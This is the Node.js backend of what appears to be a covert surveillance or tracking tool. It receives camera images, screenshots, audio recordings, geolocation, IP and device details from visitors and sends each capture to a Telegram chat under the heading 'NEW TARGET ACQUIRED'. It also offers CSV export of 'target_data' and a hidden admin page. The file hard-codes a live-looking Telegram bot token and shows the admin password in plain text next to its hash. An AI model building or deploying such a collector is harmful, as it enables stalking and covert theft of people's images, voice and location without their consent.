const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const bcrypt = require('bcrypt');

const app = express();
const PORT = 8080;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

// ==========================================
// TELEGRAM CONFIG
// ==========================================
const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
const TELEGRAM_CHAT_ID = '5387196154';

// ==========================================
// ENCRYPTED ADMIN PASSWORD - CORRECT HASH!
// ==========================================
// Password: admin123#@!
const ADMIN_PASSWORD_HASH = '$2b$10$WL/uVqDgR1Z94OoXTPzkTewSFsjqN8LiBrGwUEeoV1DdFbjvPJMO6';

async function verifyPassword(plainPassword) {
    try {
        return await bcrypt.compare(plainPassword, ADMIN_PASSWORD_HASH);
    } catch(err) {
        console.error('Password verify error:', err);
        return false;
    }
}

// ==========================================
// TELEGRAM FUNCTIONS
// ==========================================
async function sendTelegramPhoto(imageData, caption) {
    try {
        const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Image, 'base64');
        
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', buffer, { filename: 'capture.jpg' });
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        
        await axios.post(url, formData, {
            headers: formData.getHeaders()
        });
        console.log('✅ Telegram photo sent!');
    } catch (error) {
        console.error('❌ Telegram photo error:', error.message);
        await sendTelegramMessage(caption);
    }
}

async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent!');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// ==========================================
// DATA STORE
// ==========================================
let allData = [];
let idCounter = 1;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/secret-admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
});

// ==========================================
// STORE DATA
// ==========================================
app.post('/api/store', async (req, res) => {
    try {
        const { 
            cameraImage, location, deviceDetails, screenshot, 
            userPhoto, audioData, ipAddress, fullDeviceInfo,
            networkSpeed, liveLocation
        } = req.body;

        const newEntry = {
            _id: 'id_' + idCounter++,
            cameraImage: cameraImage || null,
            location: location || { lat: 0, lng: 0 },
            deviceDetails: deviceDetails || {},
            fullDeviceInfo: fullDeviceInfo || {},
            screenshot: screenshot || null,
            userPhoto: userPhoto || null,
            audioData: audioData || null,
            ipAddress: ipAddress || 'Unknown',
            networkSpeed: networkSpeed || {},
            liveLocation: liveLocation || {},
            timestamp: new Date().toISOString()
        };

        allData.unshift(newEntry);
        console.log('✅ Stored! Total:', allData.length);

        const caption = `
🔴 <b>NEW TARGET ACQUIRED</b> 🔴
📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
📱 Device: ${fullDeviceInfo?.deviceName || deviceDetails?.deviceName || 'Unknown'}
📡 IP: ${ipAddress || 'Unknown'}
📱 Model: ${fullDeviceInfo?.deviceModel || 'Unknown'}
📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
🚀 Speed: ${networkSpeed?.download || 'Unknown'} Mbps
🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
🕐 Time: ${new Date().toISOString()}
        `;

        if (userPhoto) {
            await sendTelegramPhoto(userPhoto, caption);
        } else if (screenshot) {
            await sendTelegramPhoto(screenshot, caption);
        } else {
            await sendTelegramMessage(caption);
        }

        res.json({ success: true, message: 'Data stored!', id: newEntry._id });

    } catch (err) {
        console.error('Store error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ==========================================
// GET IP
// ==========================================
app.get('/api/get-ip', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               'Unknown';
    res.json({ success: true, ip: ip });
});

// ==========================================
// EXPORT CSV
// ==========================================
app.get('/api/export-csv', (req, res) => {
    try {
        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio\n';
        
        allData.forEach(item => {
            const row = [
                item._id,
                item.timestamp,
                item.location?.lat || 0,
                item.location?.lng || 0,
                item.ipAddress || 'Unknown',
                item.deviceDetails?.deviceName || 'Unknown',
                item.fullDeviceInfo?.deviceModel || 'Unknown',
                item.fullDeviceInfo?.connection?.type || 'Unknown',
                item.networkSpeed?.download || 'Unknown',
                item.audioData ? 'Yes' : 'No'
            ];
            csv += row.join(',') + '\n';
        });

        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=target_data.csv');
        res.send(csv);
    } catch(err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// ==========================================
// ADMIN - VERIFY ENCRYPTED PASSWORD
// ==========================================
app.post('/api/admin/get-data', async (req, res) => {
    try {
        const { password } = req.body;
        
        console.log('🔑 Attempting login...');
        const isValid = await verifyPassword(password);
        
        if (!isValid) {
            console.log('❌ Invalid password attempt');
            return res.status(401).json({ 
                success: false, 
                message: '⛔ ACCESS DENIED!',
                error: 'Invalid credentials'
            });
        }
        
        console.log('✅ Admin access granted');
        res.json({ 
            success: true, 
            count: allData.length, 
            data: allData 
        });
        
    } catch (err) {
        console.error('Admin error:', err);
        res.status(500).json({ 
            success: false, 
            error: err.message 
        });
    }
});

app.post('/api/admin/delete', async (req, res) => {
    try {
        const { password, id } = req.body;
        
        const isValid = await verifyPassword(password);
        
        if (!isValid) {
            return res.status(401).json({ 
                success: false, 
                message: '⛔ ACCESS DENIED!' 
            });
        }
        
        allData = allData.filter(item => item._id !== id);
        console.log('🗑️ Deleted:', id);
        res.json({ success: true, message: 'Deleted!' });
        
    } catch (err) {
        console.error('Delete error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server: http://localhost:${PORT}`);
    console.log(`🔑 Admin: /secret-admin.html`);
    console.log(`📱 Telegram Bot Active!`);
});
